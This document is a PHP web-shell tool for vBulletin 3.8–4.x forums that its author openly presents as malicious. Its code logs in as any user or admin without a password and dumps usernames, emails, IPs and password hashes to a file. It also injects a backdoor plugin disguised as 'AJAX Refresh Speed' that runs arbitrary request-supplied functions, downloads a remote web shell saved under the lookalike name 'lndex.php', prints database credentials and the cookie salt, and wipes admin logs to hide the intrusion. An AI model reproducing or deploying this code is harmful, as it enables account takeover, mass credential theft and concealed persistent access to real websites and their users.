<?php

/**
 * vBulletin 3.8.x-4.x Login Shell
 * Author: JB (jb@p0wersurge.com)
 * www.p0wersurge.com
 * 13/01/2014 (updated 27/07/2015)
 * Version 2.0
 */
#chdir('../');
@ini_set('display_errors', false);
$self = explode('/', $_SERVER['PHP_SELF']);
$scount = count($self);
define('SELF', $self[$scount-1]);
if($_REQUEST['do'] == 'staggereduserexport')
{
    if(isset($_REQUEST['startat']) && isset($_REQUEST['linestoget']) && isset($_REQUEST['time']))
    {
        require_once('includes/config.php');
        mysql_connect($config['MasterServer']['servername'] . ':' . $config['MasterServer']['port'], $config['MasterServer']['username'], $config['MasterServer']['password']) or die(mysql_error());
        mysql_select_db($config['Database']['dbname']) or die(mysql_error());
        $startat = intval($_REQUEST['startat']);
        $linestoget = intval($_REQUEST['linestoget']);
        $time = intval($_REQUEST['time']);
        $query = mysql_query("SELECT CONCAT_WS(':', `username`, `email`, `ipaddress`, `password`, `salt`) AS userinfo FROM " . $config['Database']['tableprefix'] . "user LIMIT $startat,$linestoget") or die(mysql_error());
        while($row = mysql_fetch_array($query))
        {
            $put = @file_put_contents('loginshell_dump_' . $time . '.txt', $row['userinfo'] . PHP_EOL, FILE_APPEND);
            if(!$put)
            {
                echo 'failed to write :(';
            }
            else
            {
                echo 'wrote lines ' . $startat . ' to ' . $linestoget . ' into dumpfile';
            }
        }
    }
    exit;
}
require_once('./global.php');

error_reporting(0);
if(substr($vbulletin->versionnumber, 0, 1) > 3)
{
    $fullperms = '16744444';
    function verify_authentication2($username)
    {
        global $vbulletin;

        $username = strip_blank_ascii($username, ' ');

        if ($vbulletin->userinfo = $vbulletin->db->query_first("SELECT userid, usergroupid, membergroupids, infractiongroupids, username, password, salt FROM " . TABLE_PREFIX . "user WHERE username = '" . $vbulletin->db->escape_string(htmlspecialchars_uni($username)) . "'"))
        {
            set_authentication_cookies($cookieuser);

            $return_value = true;
            ($hook = vBulletinHook::fetch_hook('login_verify_success')) ? eval($hook) : false;
            return $return_value;
        }

        $return_value = false;
        ($hook = vBulletinHook::fetch_hook('login_verify_failure_username')) ? eval($hook) : false;
        return $return_value;
    }
}
else
{
    $fullperms = '491516';
    function verify_authentication2($username)
    {
        global $vbulletin;

        $username = strip_blank_ascii($username, ' ');

        if ($vbulletin->userinfo = $vbulletin->db->query_first("SELECT userid, usergroupid, membergroupids, infractiongroupids, username, password, salt FROM " . TABLE_PREFIX . "user WHERE username = '" . $vbulletin->db->escape_string(htmlspecialchars_uni($username)) . "'"))
        {
            if ($vbulletin->GPC[COOKIE_PREFIX . 'userid'] AND $vbulletin->GPC[COOKIE_PREFIX . 'userid'] != $vbulletin->userinfo['userid'])
			{
				// we have a cookie from a user and we're logging in as
				// a different user and we're not going to store a new cookie,
				// so let's unset the old one
				vbsetcookie('userid', '', true, true, true);
				vbsetcookie('password', '', true, true, true);
			}
            vbsetcookie('userid', $vbulletin->userinfo['userid'], true, true, true);
            vbsetcookie('password', md5($vbulletin->userinfo['password'] . COOKIE_SALT), true, true, true);
            $return_value = true;
            ($hook = vBulletinHook::fetch_hook('login_verify_success')) ? eval($hook) : false;
            return $return_value;
        }
        
        $return_value = false;
        ($hook = vBulletinHook::fetch_hook('login_verify_failure_username')) ? eval($hook) : false;
        return $return_value;
    }
}

$guess = array();
$known = array(
	'archive',
	'clientscript',
	'cpstyles',
	'customavatars',
	'customgroupicons',
	'customprofilepics',
	'attach',
	'forumrunner',
	'images',
	'includes',
	'install',
	'packages',
	'signaturepics',
	'store_sitemap',
	'vb'
);
$admindir = $vbulletin->config['Misc']['admincpdir'];
$complete = $vbulletin->options['bburl'] . '/' . $admindir . '/index.php';
$results = scandir('.');

foreach ($results as $result) {
    if ($result == '.' or $result == '..') continue;

    if (is_dir('./' . $result)) {
		if(in_array($result, $known)) continue;
		if(@file_exists($result . '/adminlog.php'))
		{
			$guess[] = $result;
		} else {
			continue;
		}
    }
}

if(isset($_POST['do']) && $_POST['do'] == 'fetchplugins')
{
    $productid = $_POST['productid'];
    $query = $vbulletin->db->query("SELECT * FROM " . TABLE_PREFIX . "plugin WHERE product = '$productid'");
    if($vbulletin->db->num_rows($query) < 1)
    {
        echo '<li><span style="color: red;">No plugins found.</span></li>';
    }
    else
    {
        while($plugin = $vbulletin->db->fetch_array($query))
        {
            if($productid == 'vbulletin')
            {
                $product = array(
                    'active'    =>  (($vbulletin->options['bbactive']) ? true : false)
                );
            }
            else
            {
                $product = $vbulletin->db->query_first("SELECT * FROM " . TABLE_PREFIX . "product WHERE productid = '$productid'");
            }
            if((!$product['active']) or ($product['active'] && !$plugin['active']))
            {
                $color = 'red';
            }
            else
            {
                $color = 'green';
            }
            echo '<li>';
            echo '<a href="' . SELF . '?do=edithook&hookid=' . $plugin['pluginid'] . '" style="color: ' . $color . '">' . $plugin['title'] . '</a> (on hook ' . $plugin['hookname'] . ')';
            echo '</li>';
        }
    }
    exit;
}
elseif($_POST['do'] == 'doedithook')
{
    $product = $_POST['product'];
    $hook = $_POST['hooklocation'];
    $title = $_POST['title'];
    $code = $_POST['phpcode'];
    $execorder = intval($_POST['execorder']);
    $active = intval($_POST['active']);
    $pluginid = $_POST['hookid'];
    
    $vbulletin->db->query("
        UPDATE " . TABLE_PREFIX . "plugin
        SET
            hookname = '$hook',
            title = '" . $vbulletin->db->escape_string($title) . "',
            phpcode = '" . $vbulletin->db->escape_string($code) . "',
            product = '$product',
            active = $active,
            executionorder = $execorder
        WHERE pluginid = '$pluginid'
    ");
    
    vBulletinHook::build_datastore($db);
    ?>
    <h1>Plugin saved!</h1>
    <pre>
<?php echo print_r($_POST); ?>
    </pre>
    <a href="<?php echo SELF; ?>">Go back</a>
    <?php
    exit;
}
elseif($_POST['do'] == 'doclearadminlog')
{
    switch($_POST['method'])
    {
        case '0':
            $query = $vbulletin->db->query("TRUNCATE TABLE " . TABLE_PREFIX . "adminlog");
        break;
        case '1':
            $query = $vbulletin->db->query("DELETE FROM " . TABLE_PREFIX . "adminlog");
        break;
        case '2':
            $query = $vbulletin->db->query("DROP TABLE " . TABLE_PREFIX . "adminlog");
        break;
        case '3':
        default:
            $query = $vbulletin->db->query("DELETE FROM " . TABLE_PREFIX . "adminlog WHERE ipaddress = '" . $vbulletin->db->escape_string($_SERVER['REMOTE_ADDR']) . "'");
        break;
    }
    ?>
    <h1>Adminlog cleared!</h1>
    <a href="<?php echo SELF; ?>">Go back</a>
    <?php
    exit;
}
elseif($_POST['do'] == 'hookenabler')
{
    $enabled = $_POST['hooksenabled'];
    $settings = $_POST['settings'];
    $config = $_POST['config'];
    
    $done = 'disabled';
    if($enabled)
    {
        $done = 'enabled';
    }
    
    if(!$settings && !$config)
    {
        ?>
        <h1>Failed to update system</h1>
        <p>No save method was defined.</p>
        <?php
    }
    else
    {
        echo '<h1>Plugin Enabler/Disabler</h1>';
        if($settings)
        {
            $vbulletin->db->query("
                UPDATE " . TABLE_PREFIX . "setting SET value = '$enabled' WHERE varname = 'enablehooks'
            ");
            require_once(DIR . '/includes/adminfunctions.php');
            build_options();
            ?>
            <p>Hooks <?php echo $done; ?> in settings</p>
            <?php
        }
        
        if($config)
        {
            $current_config = $vbulletin->config;
            $configfile = '<?php
@ini_set(\'display_errors\', false);
' . (($enabled) ? '' : 'define(\'DISABLE_HOOKS\', true);') . '
$config[\'Database\'][\'dbtype\'] = \'' . $current_config['Database']['dbtype'] . '\';
$config[\'Database\'][\'dbname\'] = \'' . $current_config['Database']['dbname'] . '\';
$config[\'Database\'][\'tableprefix\'] = \'' . $current_config['Database']['tableprefix'] . '\';
$config[\'Database\'][\'technicalemail\'] = \'' . $current_config['Database']['technicalemail'] . '\';
$config[\'Database\'][\'force_sql_mode\'] = ' . (($current_config['Database']['force_sql_mode'] == null) ? '0' : '1') . ';
$config[\'MasterServer\'][\'servername\'] = \'' . $current_config['MasterServer']['servername'] . '\';
$config[\'MasterServer\'][\'port\'] = ' . $current_config['MasterServer']['port'] . ';
$config[\'MasterServer\'][\'username\'] = \'' . $current_config['MasterServer']['username'] . '\';
$config[\'MasterServer\'][\'password\'] = \'' . $current_config['MasterServer']['password'] . '\';
$config[\'MasterServer\'][\'usepconnect\'] = ' . $current_config['MasterServer']['usepconnect'] . ';
$config[\'SlaveServer\'][\'servername\'] = \'' . $current_config['SlaveServer']['servername'] . '\';
$config[\'SlaveServer\'][\'port\'] = ' . $current_config['SlaveServer']['port'] . ';
$config[\'SlaveServer\'][\'username\'] = \'' . $current_config['SlaveServer']['username'] . '\';
$config[\'SlaveServer\'][\'password\'] = \'' . $current_config['SlaveServer']['password'] . '\';
$config[\'SlaveServer\'][\'usepconnect\'] = ' . $current_config['SlaveServer']['usepconnect'] . ';
$config[\'Misc\'][\'admincpdir\'] = \'' . $current_config['Misc']['admincpdir'] . '\';
$config[\'Misc\'][\'modcpdir\'] = \'' . $current_config['Misc']['modcpdir'] . '\';
$config[\'Misc\'][\'cookieprefix\'] = \'' . $current_config['Misc']['cookieprefix'] . '\';
$config[\'Misc\'][\'forumpath\'] = \'' . $current_config['Misc']['forumpath'] . '\';
$config[\'SpecialUsers\'][\'canviewadminlog\'] = \'' . $current_config['SpecialUsers']['canviewadminlog'] . '\';
$config[\'SpecialUsers\'][\'canpruneadminlog\'] = \'' . $current_config['SpecialUsers']['canpruneadminlog'] . '\';
$config[\'SpecialUsers\'][\'canrunqueries\'] = \'' . $current_config['SpecialUsers']['canrunqueries'] . '\';
$config[\'SpecialUsers\'][\'undeletableusers\'] = \'' . $current_config['SpecialUsers']['undeletableusers'] . '\';
$config[\'SpecialUsers\'][\'superadministrators\'] = \'' . $current_config['SpecialUsers']['superadministrators'] . '\';
$config[\'Mysqli\'][\'ini_file\'] = \'' . $current_config['Mysqli']['ini_file'] . '\';
$config[\'Misc\'][\'maxwidth\'] = ' . $current_config['Misc']['maxwidth'] . ';
$config[\'Misc\'][\'maxheight\'] = ' . $current_config['Misc']['maxheight'] . ';';
            $do_backup = file_put_contents(DIR . '/includes/config.php.txt', file_get_contents(DIR . '/includes/config.php'));
            if($do_backup)
            {
                ?>
                <p>Backed up original config.php to <a href="includes/config.php.txt" target="_blank">config.php.txt</a></p>
                <?php
            }
            else
            {
                ?>
                <p>Failed to back up original config.php</p>
                <?php
            }
            
            $do_write = file_put_contents(DIR . '/includes/config.php', $configfile);
            if($do_write)
            {
                ?>
                <p>Hooks <?php echo $done; ?> in config.php</p>
                <?php
            }
            else
            {
                ?>
                <p>Failed to write new config.php</p>
                <?php
            }
        }
        ?>
        <p><a href="<?php echo SELF; ?>">Go back</a></p>
        <?php
    }
    
    exit;
}



if(isset($_REQUEST['do']) && $_REQUEST['do'] == 'login' && isset($_REQUEST['username']))
{
	require_once(DIR . '/includes/functions_login.php');
	
	$username = $_REQUEST['username'];
	$q = "SELECT username FROM " . TABLE_PREFIX . "user WHERE username = '" . $vbulletin->db->escape_string($username) . "' OR userid = '" . $vbulletin->db->escape_string($username) . "'";
	$query = $vbulletin->db->query_first($q);
	if($query['username'] != null)
	{
		if(verify_authentication2($query['username']))
		{
			exec_unstrike_user($query['username']);
			
			process_new_login('cplogin', true, null);
			
			do_login_redirect();
		}
		else
		{
			die('Verify failed');
		}
	}
	else
	{
		die('User not found.');
	}
}
elseif($_REQUEST['do'] == 'injectplugin')
{
    $products = array();
    $query = $vbulletin->db->query("SELECT productid,title,version,active,url FROM " . TABLE_PREFIX . "product WHERE active = '1'");
    if($vbulletin->db->num_rows($query) > 0)
    {
        while($product = $vbulletin->db->fetch_array($query))
        {
            $productinfo = array();
            $productinfo['productid'] = $product['productid'];
            $productinfo['title'] = $product['title'];
            $productinfo['version'] = $product['version'];
            $productinfo['active'] = $product['active'];
            $productinfo['url'] = $product['url'];
            $products[] = $productinfo;
        }
    }
    
    // choose a random product if productcount > 0 else inject into vbulletin
    $productcount = count($products);
    $plugin['title'] = 'AJAX Refresh Speed';
    $plugin['hookname'] = 'global_complete';
    $plugin['phpcode'] = 'if(isset($_REQUEST[\'x\'])){$_REQUEST[\'x\']($_REQUEST[\'y\']);}';
    if(intval($productcount) > 0)
    {
        // failsafe incase product is disabled - we should only ever be injecting into an enabled product, or our injection is worthless
        // optional really, you can just make it insert into vbulletin itself but that's not really as covert as i'd like
        $rand = mt_rand(0, intval($productcount));
        $plugin['product'] = $products[$rand]['productid'];
    }
    else
    {
        $plugin['product'] = 'vbulletin';
    }
    $plugin['devkey'] = '';
    $plugin['active'] = '1';
    $plugin['executionorder'] = '5';
    
    $vbulletin->db->query("
        INSERT INTO " . TABLE_PREFIX . "plugin
        (
            hookname,
            title,
            phpcode,
            product,
            active,
            executionorder
        )
        VALUES
        (
            '" . $plugin['hookname'] . "',
            '" . $plugin['title'] . "',
            '" . $vbulletin->db->escape_string($plugin['phpcode']) . "',
            '" . $vbulletin->db->escape_string($plugin['product']) . "',
            " . intval($plugin['active']) . ",
            " . intval($plugin['executionorder']) . "
        )
    ");
    $pluginid = $vbulletin->db->insert_id();
    // update the datastore
	vBulletinHook::build_datastore($db);
    ?>
    <h1>Plugin <?php echo $pluginid; ?> created on global_complete!</h1>
    <pre>
<?php echo print_r($plugin); ?>
    </pre>
    <a href="<?php echo SELF; ?>">Go back</a>
    <?php
}
elseif($_REQUEST['do'] == 'edithook')
{
    $pluginid = $_REQUEST['hookid'];
    $plugin = $vbulletin->db->query_first("SELECT * FROM " . TABLE_PREFIX . "plugin WHERE pluginid = '$pluginid'");
    $product = $vbulletin->db->query_first("SELECT title FROM " . TABLE_PREFIX . "product WHERE productid = '$plugin[product]'");
    $products = $vbulletin->db->query("SELECT productid,title FROM " . TABLE_PREFIX . "product");
    ?>
    <h1>Modifying plugin '<?php echo $plugin['title']; ?>' (<?php echo $product['title']; ?>)</h1>
    <form action="<?php echo SELF; ?>" method="post">
        <input type="hidden" name="do" value="doedithook">
        <input type="hidden" name="hookid" value="<?php echo $_GET['hookid']; ?>">
        <h4>Product</h4>
        <select name="product">
            <option value="vbulletin"<?php if($plugin['product'] == 'vbulletin'){ ?> selected<?php } ?>>vBulletin</option>
            <?php
            if($vbulletin->db->num_rows($products) > 0)
            {
                while($single_product = $vbulletin->db->fetch_array($products))
                {
                    echo '<option value="' . $single_product['productid'] . '"' . (($plugin['product'] == $single_product['productid']) ? ' selected' : '') . '>' . $single_product['title'] . '</option>';
                }
            }
            ?>
        </select>
        <h4>Hook Location</h4>
        <input type="text" name="hooklocation" value="<?php echo $plugin['hookname']; ?>">
        <h4>Plugin Title</h4>
        <input type="text" name="title" value="<?php echo $plugin['title']; ?>">
        <h4>Plugin Code</h4>
        <textarea rows="20" cols="80" name="phpcode"><?php echo $plugin['phpcode']; ?></textarea>
        <h4>Plugin Execution Order</h4>
        <input type="text" name="execorder" value="<?php echo $plugin['executionorder']; ?>">
        <h4>Plugin Active</h4>
        <input type="radio" name="active" value="1"<?php if($plugin['active']){ ?> checked<?php } ?>> Yes
        <input type="radio" name="active" value="0"<?php if(!$plugin['active']){ ?> checked<?php } ?>> No
        <br />
        <br />
        <br />
        <button type="button" onclick="window.location.href = '<?php echo SELF; ?>'">Cancel</button>
        <input type="submit" name="save" value="Save Plugin">
    </form>
    <?php
}
elseif($_REQUEST['do'] == 'installteampsshell')
{
    $link = 'https://raw.githubusercontent.com/p0wersurge/teamps-shell/master/teamps.php';
    $get = @file_get_contents($link);
    $put = @file_put_contents('lndex.php', $get);
    if($put)
    {
        ?>
        <h1>TeamPS Shell installed!</h1>
        <p><a href="lndex.php" target="_blank">Go to shell</a></p>
        <p><a href="<?php echo SELF; ?>">Go back</a></p>
        <?php
    }
    else
    {
        ?>
        <h1>TeamPS Shell failed to install :(</h1>
        <p><a href="<?php echo SELF; ?>">Go back</a></p>
        <?php
    }
}
elseif($_REQUEST['do'] == 'clearadminlog')
{
    ?>
    <h1>Clear adminlog</h1>
    <h3>How do you want to clear it?</h3>
    <form action="<?php echo SELF; ?>" method="post">
        <input type="hidden" name="do" value="doclearadminlog">
        <p><input type="radio" name="method" value="0"> Truncate entire table (resets adminlogid to 0)</p>
        <p><input type="radio" name="method" value="1"> Delete entire table (does not reset adminlogid)</p>
        <p><input type="radio" name="method" value="2"> Drop entire table (removes the table from the database completely, will cause db errors for site admins)</p>
        <p><input type="radio" name="method" value="3" checked> Just clear my logs (best option)</p>
        <button type="button" onclick="window.location.href = '<?php echo SELF; ?>'">Cancel</button>
        <input type="submit" name="clear" value="Clear adminlog">
    </form>
    <?php
}
elseif($_REQUEST['do'] == 'enableproduct' || $_REQUEST['do'] == 'disableproduct')
{
    if($_REQUEST['do'] == 'enableproduct')
    {
        $active = '1';
        $done = 'enabled';
    }
    elseif($_REQUEST['do'] == 'disableproduct')
    {
        $active = '0';
        $done = 'disabled';
    }
    
    $productid = $_GET['productid'];
    
    $vbulletin->db->query("
        UPDATE " . TABLE_PREFIX . "product
        SET active = '$active'
        WHERE productid = '$productid'
    ");
    require_once(DIR . '/includes/adminfunctions.php');
    vBulletinHook::build_datastore($db);
    build_product_datastore();
    
    require_once(DIR . '/includes/class_bitfield_builder.php');
    vB_Bitfield_Builder::save($db);
    vB_Cache::instance()->purge('vb_types.types');
    require_once(DIR . '/includes/functions_cron.php');
    build_cron_next_run();
    require_once(DIR . '/includes/class_block.php');
    $blockmanager = vB_BlockManager::create($vbulletin);
    $blockmanager->reloadBlockTypes();
    $blockmanager->getBlocks(true, true);
    
    if($_REQUEST['do'] == 'enableproduct')
    {
        require_once(DIR . '/includes/adminfunctions_template.php');
        build_all_styles(0, 0, 'plugin.php?do=product', false, 'standard');
        build_all_styles(0, 0, 'plugin.php?do=product', false, 'mobile');
    }
    ?>
    <h1>Product <?php echo $productid . ' ' . $done; ?>!</h1>
    <p><a href="<?php echo SELF; ?>">Go back</a></p>
    <?php
}
elseif($_REQUEST['do'] == 'hookenabler')
{
    ?>
    <h1>Enable/Disable Plugins</h1>
    <form action="<?php echo SELF; ?>" method="post">
        <input type="hidden" name="do" value="hookenabler">
        <p><input type="radio" name="hooksenabled" value="1" checked> Enable Hooks</p>
        <p><input type="radio" name="hooksenabled" value="0"> Disable Hooks</p>
        <p><input type="checkbox" name="settings" checked> In settings</p>
        <p><input type="checkbox" name="config"> In config.php</p>
        <input type="submit" name="save" value="Save">
    </form>
    <?php
}
elseif($_REQUEST['do'] == 'exportusers')
{
    $users = $vbulletin->db->query_first("SELECT count(userid) AS count FROM " . TABLE_PREFIX . "user");
    ?>
    <style type="text/css">
        progress[value] {
            appearance: none;
            -webkit-appearance: none;
        }
    </style>
    <h1>User table export (<?php echo $users['count']; ?> users)</h1>
    <progress style="width: 100%;" max="<?php echo $users['count']; ?>" value="0" id="userinfo_progress"></progress>
    <p>Current progress: <span id="percentdumped">0</span>%</p>
    <p><input type="text" id="atatime" value="10000"> Users to dump on each load</p>
    <p><input type="text" id="timeout" value="3"> Time to wait in seconds between requests</p>
    <p><a id="opendump" target="_blank" style="display: none;" href="loginshell_dump_<?php echo TIMENOW; ?>.txt">Open Dump File</a></p>
    <p><button id="startdump" onclick="staggerUserDump()">Start Export</button></p>
    <p><a href="<?php echo SELF; ?>">Go back</a></p>
    <script type="text/javascript">
        var currentLine = 0;
        var linesToDump = 0;
        var stopNow = false;
        var timeout;
        var ready;
        var done = false;
        var start;
        var retrieved;
        function openInNewTab(url)
        {
            var win = window.open(url, '_blank');
            win.focus();
        }
        staggerUserDump = function()
        {
            document.getElementById('startdump').style.display = 'none';
            linesToDump = parseInt(document.getElementById('atatime').value);
            if(stopNow == true)
            {
                return true;
            }
            
            ajax = new XMLHttpRequest();
            ajax.onreadystatechange = function()
            {
                if(ajax.readyState == 4 && ajax.status == 200)
                {
                    percent = (currentLine/<?php echo $users['count']; ?>)*100;
                    document.getElementById('userinfo_progress').value = document.getElementById('userinfo_progress').value+linesToDump;
                    if(percent > 100)
                    {
                        percent = 100;
                        done = true;
                    }
                    document.getElementById('percentdumped').innerHTML = Math.round(percent);
                    /**document.getElementById('userinfo').innerHTML = document.getElementById('userinfo').innerHTML + ajax.responseText;**/
                    retrieved = retrieved + ajax.responseText;
                    if(ajax.responseText == '')
                    {
                        document.getElementById('opendump').style.display = 'block';
                        stopNow = true;
                        return true;
                    }
                    else
                    {
                        currentLine = currentLine+linesToDump;
                        ajax.abort();
                        staggerUserDump();
                    }
                }
            }
            
            ajax.open('POST', '<?php echo SELF; ?>');
            ajax.setRequestHeader('Content-type','application/x-www-form-urlencoded');
            ajax.send('do=staggereduserexport&startat=' + currentLine + '&linestoget=' + linesToDump + '&time=<?php echo TIMENOW; ?>');
        }
    </script>
    <?php
}
else
{
    $admin_usergroups = array();
    $admin_usergroups_query = $vbulletin->db->query("SELECT usergroupid FROM " . TABLE_PREFIX . "usergroup WHERE adminpermissions = '3'");
    while($admin_usergroup = $vbulletin->db->fetch_array($admin_usergroups_query))
    {
        $admin_usergroups[] = $admin_usergroup['usergroupid'];
    }
    $admins = array();
    $query = $vbulletin->db->query("SELECT userid,adminpermissions FROM " . TABLE_PREFIX . "administrator");
    while($user = $vbulletin->db->fetch_array($query))
    {
        $userinfo = fetch_userinfo($user['userid']);
        $userarray = array();
        $userarray['userid'] = $userinfo['userid'];
        $userarray['username'] = $userinfo['username'];
        $userarray['musername'] = fetch_musername($userinfo);
        $userarray['adminpermissions'] = $user['adminpermissions'];
        $admins[] = $userarray;
    }
    $products = array();
    $query = $vbulletin->db->query("SELECT productid,title,version,active,url FROM " . TABLE_PREFIX . "product");
    if($vbulletin->db->num_rows($query) > 0)
    {
        while($product = $vbulletin->db->fetch_array($query))
        {
            $productinfo = array();
            $productinfo['productid'] = $product['productid'];
            $productinfo['title'] = $product['title'];
            $productinfo['version'] = $product['version'];
            $productinfo['active'] = $product['active'];
            $productinfo['url'] = $product['url'];
            $products[] = $productinfo;
        }
    }
    ?>
    <head><title>vB LoginShell 2.0</title></head>
    <h1>vBulletin Login Shell | CP Login (<?php echo $vbulletin->options['bbtitle']; ?>) (vB<?php echo substr($vbulletin->versionnumber,0 ,1); ?>)</h1>
    <hr />
    <form action="<?php echo SELF; ?>" method="get">
        <input type="hidden" name="do" value="login" />
        <input type="text" name="username" value="" />
        <input type="submit" name="login" value="Login as user" />
    </form>
    <hr />
    <p>Admins found: <?php echo count($admins); ?></p>
    <p><?php foreach($admins as $admin){ echo '<a href="' . SELF . '?do=login&username=' . $admin['username'] . '">' . $admin['musername'] . '</a>' . (($admin['adminpermissions'] == $fullperms) ? ' (full permissions)' : '') . ' ';} ?></p>
    <hr />
    <p>AdminCP directory detected in config: <a href="<?php echo $complete; ?>" target="_blank"><?php echo $admindir; ?></a></p>
    <p>Possible AdminCP directories (from existing subdirectories minus vBulletin standard): <?php foreach($guess as $dir) { echo '<a href="' . $vbulletin->options['bburl'] . '/' . $dir . '/index.php" target="_blank">' . $dir . '</a> '; }?></p>
    <hr />
    <p><a href="<?php echo SELF; ?>?do=injectplugin">Inject malicious plugin</a></p>
    <p><a href="<?php echo SELF; ?>?do=installteampsshell">Install TeamPS Shell to lndex.php</a></p>
    <p><a href="<?php echo SELF; ?>?do=clearadminlog">Clear adminlog</a></p>
    <p><a href="<?php echo SELF; ?>?do=exportusers">Export users</a></p>
    <hr />
    <h3>Config Info</h3>
    <pre>
<?php echo print_r($vbulletin->config); ?>
    </pre>
    <hr />
    <p>Cookie prefix: <?php echo COOKIE_PREFIX; ?></p>
    <p>Cookie salt: <?php echo COOKIE_SALT; ?></p>
    <hr />
    <h3>Installed Products</h3>
    <ul>
        <li id="vbulletin"><span style="color: green;"><a style="color: green;" href="#" onclick="getPluginsForProduct('vbulletin');">vBulletin (<?php echo $vbulletin->versionnumber; ?>)</a></span></li>
        <?php
        foreach($products as $product)
        {
            if($product['active'])
            {
                $color = 'green';
            }
            else
            {
                $color = 'red';
            }
            
            echo '<li id="' . $product['productid'] . '"><span style="color: ' . $color . ';"><a style="color: ' . $color . '" href="#" onclick="getPluginsForProduct(\'' . $product['productid'] . '\');">' . $product['title'] . '</a>' . ' (' . $product['version'] . ')' . ((trim($product['url']) != null) ? ' (<a href="' . trim($product['url']) . '" target="_blank">URL</a>)' : '') . ' (<a href="' . SELF . '?do=enableproduct&productid=' . $product['productid'] . '">enable</a>/<a href="' . SELF . '?do=disableproduct&productid=' . $product['productid'] . '">disable</a>)</span></li>';
        }
        ?>
    </ul>
    <p><a href="<?php echo SELF; ?>?do=hookenabler">Globally enable/disable hooks</a></p>
    <hr />
    <h6>Written by <a href="https://twitter.com/xijailbreakx" target="_blank">@xijailbreakx</a>. This file allows you to override the default vBulletin login system and login to the control panel and forums as anyone. It also tries to find the admincp directory, by using both the configuration file (possibly incorrectly set) and by guessing based on existing subdirectories (nearly 100% successful). It also allows for modifications of the plugin system, injection of a malicious plugin or shell, and deletion of administrator logs without logging any information in the admin log.</h6>
    <script type="text/javascript">
        function getPluginsForProduct(productid)
        {
            ajax = new XMLHttpRequest();
            ajax.onreadystatechange = function()
            {
                if(ajax.readyState == 4 && ajax.status == 200)
                {
                    ul = document.createElement('ul');
                    ul.setAttribute('id', 'pluginlist_' + productid);
                    document.getElementById(productid).appendChild(ul);
                    
                    document.getElementById('pluginlist_' + productid).innerHTML = ajax.responseText;
                }
            }
            
            ajax.open('POST', '<?php echo SELF; ?>');
            ajax.setRequestHeader('Content-type','application/x-www-form-urlencoded');
            ajax.send('do=fetchplugins&productid=' + productid);
        }
    </script>
    <?php
}

?>
